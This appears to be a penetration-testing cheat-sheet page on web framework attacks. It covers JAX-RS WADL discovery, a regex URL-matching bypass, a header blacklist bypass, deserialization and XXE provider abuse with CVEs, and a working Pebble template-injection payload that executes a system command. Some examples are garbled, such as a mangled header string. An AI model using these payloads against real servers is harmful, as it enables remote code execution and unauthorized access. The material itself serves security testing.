---
title: Framework Attacks
category: Web Application
order: 110
---


> **JAX-RS** 

**Find the web application description language**

WADL is available via the following:
 * /applicaiton.wadl relative URI for JAX-RS and Jersey.  OR by sending OPTIONS request with applicaiton/vnd.sun.wadl+xml in Accept header
*  /application.xml relative URI for RESTEasy
* Apache CXF: _wadl=true parameter to URL

**URL matching ambiguites from regex:**

Example:
URI Patterns
/rest/{name}/show/{id:\\d+} is restricted
/rest/echo/{name:.+} is public

Request
/rest/echo/show/12345 accesses the restricted method


**Bypass blacklist filters for HTTP headers:**

* AccptHTapplication/jasonCRX-USER-ID: 67890
* JAX-RS uses the above string as two headers


**Selection confusion attack:**
@consumes defines the allowed content types
If resource method lacks @Consumes annotation or is too permissive (e.g., */*, application/*)
There is entity provider in CLASSPATH where isReadable method always (or mostly) returns True.

Useful entity providers:

Entity Provider | Media Type | Selection conditions | Weakness | CVE
----------------|------------|----------------------|----------|----
SerializableProvider (RESTEasy) | application/x-java-serialized-object | Entity parameter is serializable | Deser of Untrusted data | CVE-2016-7050
YamlProvider (RESTEasy) | text/yaml, text/x-yaml, application/x-yaml | Always selected | Deser of untrusted data | CVE-2016-9571
KryoMessageBody (Jersey) | application/x-kryo | Always selected | Deser of untrusted data| No CVE
AtomPojoProvider (apache cxf) | application/atom+xml | Always Selected | XXE | CVE-2016-8739

**Tools**

* Unsafe JAX-RS for Burp (https://github.com/0ang3el/Unsafe-JAX-RS-Burp)

> **Template Injection** 

** Java Pebble Example **

{% highlight java %}
{% raw %}

{% set cmd = 'id' %}
{% set bytes = (1).TYPE
     .forName('java.lang.Runtime')
     .methods[6]
     .invoke(null,null)
     .exec(cmd)
     .inputStream
     .readAllBytes() %}
{{ (1).TYPE
     .forName('java.lang.String')
     .constructors[0]
     .newInstance(([bytes]).toArray()) }}
   
{% endraw %}
{% endhighlight %}
